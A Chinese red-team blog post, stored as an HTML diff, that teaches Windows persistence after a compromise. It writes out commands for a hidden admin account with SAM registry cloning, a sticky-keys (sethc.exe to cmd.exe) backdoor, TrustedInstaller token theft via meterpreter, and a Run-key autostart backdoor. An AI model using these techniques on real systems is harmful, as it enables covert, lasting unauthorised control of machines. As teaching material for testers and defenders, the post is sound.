@@ -1,0 +1,324 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>权限维持（一） | Fstraw Blog</title><meta name="keywords" content="内网渗透"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;ZwM2h3OHhnH9WYZWO6GFdw  0x00 前言 在攻击者利用漏洞获取到某台机器的控制权限之后，会考虑将该机器作为一个持久化的据点，种植一个具备持久化的后门，从而随时可以连接该被控机器进行深入渗透。当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持（一）">
+<meta property="og:url" content="https://ccc-f.github.io/posts/8035962c.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;ZwM2h3OHhnH9WYZWO6GFdw  0x00 前言 在攻击者利用漏洞获取到某台机器的控制权限之后，会考虑将该机器作为一个持久化的据点，种植一个具备持久化的后门，从而随时可以连接该被控机器进行深入渗透。当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.862Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.933Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/8035962c"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '权限维持（一）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">权限维持（一）<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/8035962c.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.862Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.933Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/">RedTeam</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="权限维持（一）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/8035962c.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/8035962c.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>转载自：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/ZwM2h3OHhnH9WYZWO6GFdw">https://mp.weixin.qq.com/s/ZwM2h3OHhnH9WYZWO6GFdw</a></p>
+</blockquote>
+<p><strong>0x00 前言</strong></p>
+<p>在攻击者利用漏洞获取到某台机器的控制权限之后，会考虑将该机器作为一个持久化的据点，种植一个<strong>具备持久化的后门</strong>，从而随时可以连接该被控机器进行深入渗透。当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以<strong>权限维持</strong>就显得很重要了。</p>
+<h1 id="0x01-windows权限维持"><a href="#0x01-windows权限维持" class="headerlink" title="0x01 windows权限维持"></a><strong>0x01 windows权限维持</strong></h1><h2 id="1-Windows系统隐藏账户"><a href="#1-Windows系统隐藏账户" class="headerlink" title="1. Windows系统隐藏账户"></a><strong>1. Windows系统隐藏账户</strong></h2><p><strong>该方法是通过建立隐藏账户，制作系统用户远程控制后门，维持目标Windows系统权限。</strong></p>
+<p>制作方法跟步骤如下：</p>
+<p>在目标主机cmd中输入以下命令，创建一个名为whoami$的隐藏账户，并把该隐藏账户设置为管理员权限。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640.jpeg" alt="图片"></p>
+<p>如上图，我们已经创建成功，执行net user命令，发现是看不到whoami$用户的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user whoami$ Liu78963 /add</span><br><span class="line">net localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046127.jpeg" alt="图片"></p>
+<p>但是这就结束了吗，没有！虽然上面net user看不见该隐藏用户，但是在控制面板和计算机管理的本地用户和组中，仍然是可以看得到该用户的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046128.jpeg" alt="图片"></p>
+<p>为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。</p>
+<p>打开注册表编辑器，找</p>
+<p>*<strong>HKEY_LOCAL_MACHINE\SAM\SAM*</strong> ，</p>
+<p>单机右键，选择“权限”，把Administrator用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046129.jpeg" alt="图片"></p>
+<p>这样SAM下的文件就都能看见了。</p>
+<p>然后，在注册表编辑器的</p>
+<p>*<strong>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names*</strong> ，</p>
+<p>点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录***“000001F4”***：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046130.jpeg" alt="图片"></p>
+<p>复制000001F4 目录中的F键的值：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046131.jpeg" alt="图片"></p>
+<p>然后找到与隐藏账户whoami$右边类型的键值“0x3e9”相同的目录名，也就是。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046132.jpeg" alt="图片"></p>
+<p>然后将000001F4 的F值粘贴到000003E9 的F值中，点击确定：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047133.jpeg" alt="图片"></p>
+<p>然后从注册表中右键导出000003E9 和whoami$，并删除whoami$用户 </p>
+<p>- </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user whoami$ /del：</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047134.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047135.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047136.jpeg" alt="图片"></p>
+<p>此时，查看注册表以及本地用户和组或者控制面板，whoami$用户已经没有了。</p>
+<p>最后，将刚才导出的两个后缀为.reg的注册表项导入注册表中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047137.jpeg" alt="图片"></p>
+<p>这样我们的隐藏账户whoami$就创建好了。现在，不管你是在命令提示符下输入 net user 或者在系统用户管理界面都是看不到whoami$这个账户的，只有在注册表中才能看得到。</p>
+<h2 id="2-Shift-粘滞键后门"><a href="#2-Shift-粘滞键后门" class="headerlink" title="2. Shift 粘滞键后门"></a><strong>2. Shift 粘滞键后门</strong></h2><p>如果你在电脑上连按五次shift键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047138.jpeg" alt="图片"></p>
+<p>即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047139.jpeg" alt="图片"></p>
+<p>思考一下，如果我们知道了这个程序的绝对路径，那么我们就可以将cmd.exe伪装成这个粘滞键程序，</p>
+<p><strong>当我们连按五次shift键时，便会弹出一个CMD命令行窗口，那么我们就可以无需登录进系统便可以控制目标主机了。</strong></p>
+<p>粘滞键程序名称为“sethc.exe”，其路径为*<strong>“c:\windows\system32\sethc.exe”*</strong></p>
+<p>利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：</p>
+<p>（1）首先，我们手动或利用工具，找到sethc.exe将其删除或改名为sethc.exe.bak，</p>
+<p>（2）接着将cmd.exe程序复制一个副本，并命名为“sethc.exe”。</p>
+<p>（3）最后，重启计算机再次按下5次Shift键时，就会弹出CMD界面，后门制作成功。</p>
+<p>在目标主机上执行如下命令即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:\windows\system32</span><br><span class="line">move sethc.exe sethc.exe.bak // 将sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe // 将一个cmd.exe副本保存伪装成sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048140.jpeg" alt="图片"></p>
+<p>此时，我们打开目标主机的远程桌面，连续按下五次shift键，便可以看到目标主机屏幕上成功弹出了一个CMD窗口：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048141.jpeg" alt="图片"></p>
+<p>如上图，该cmd是以system权限运行的，接下来我们就可以无需知道登录密码，无需登录，直接对目标主机执行各种高权限的操作了，也完全可以新建一个高权限用户直接登录进入系统，是不是很有意思？</p>
+<p>但是，先别高兴的太早了，在一些做了防护的主机上，即使是SYSTEM权限也是无法修改sethc.exe的：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048142.jpeg" alt="图片"></p>
+<p>只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：</p>
+<p><strong>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NTSERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</strong></p>
+<p>首先进入shell启动TrustedInstaller服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048143.jpeg" alt="图片"></p>
+<p>然后执行如下即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps 					# 找到TrustedInstaller的进程PID，这里为3476</span><br><span class="line">steal_token &lt;PID&gt; 	# 从该进程中窃取令牌</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049144.jpeg" alt="图片"></p>
+<p>此时便可以对sethc.exe进行任何操作了：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049145.jpeg" alt="图片"></p>
+<h2 id="3-注册表键后门"><a href="#3-注册表键后门" class="headerlink" title="3.  注册表键后门"></a><strong>3.  注册表键后门</strong></h2><p>该方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。</p>
+<p>一般我们使用注册表的如下位置：</p>
+<p><em><strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run &#x2F;&#x2F; 开启时启动程序</strong></em></p>
+<p><em><strong>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit &#x2F;&#x2F; 登录时启动程序</strong></em></p>
+<p>首先我们制作一个metasploit后门：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049146.jpeg" alt="图片"></p>
+<p>将该后门程序上传到目标主机的C:\Windows\System32目录中：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049147.jpeg" alt="图片"></p>
+<p>然后在目标主机的meterpreter执行如下命令注册表进行操作制作后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d &#x27;C:\windows\system32\backdoor.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v</span><br><span class="line">backdoor #查看键值</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049148.jpeg" alt="图片"></p>
